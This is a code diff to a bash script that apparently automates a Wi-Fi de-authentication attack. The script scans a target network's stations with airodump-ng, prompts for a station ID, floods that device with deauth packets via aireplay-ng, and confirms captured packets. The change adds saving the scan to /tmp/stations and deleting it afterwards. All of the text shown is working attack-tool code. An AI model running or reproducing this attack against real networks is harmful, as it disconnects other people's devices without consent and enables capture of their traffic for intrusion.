@@ -119,7 +119,7 @@ main () {
 
     gt_log "Starting to look for devices on ${v_network_ssid}, channel ${v_network_channel}..."
     gt_pause "Press any key to start searching, then press \"q\" twice to stop."
-    sudo airodump-ng -d $v_network_ssid -c $v_network_channel ${v_network_adapter}mon
+    sudo airodump-ng -d $v_network_ssid -c $v_network_channel ${v_network_adapter}mon -w/tmp/stations
 
     # Run a de-auth attack for the selected device
     gt_prompt "Please specify the station-id to de-auth" v_network_station_id
@@ -133,6 +133,9 @@ main () {
     sudo aireplay-ng -0 0 -a $v_network_ssid -c $v_network_station_id ${v_network_adapter}mon
     kill -9 $pid
     gt_log "Packets captured!"
+
+    # Clear dump details
+    sudo rm /tmp/stations-01*
 
     # Stop monitoring
     gt_windup
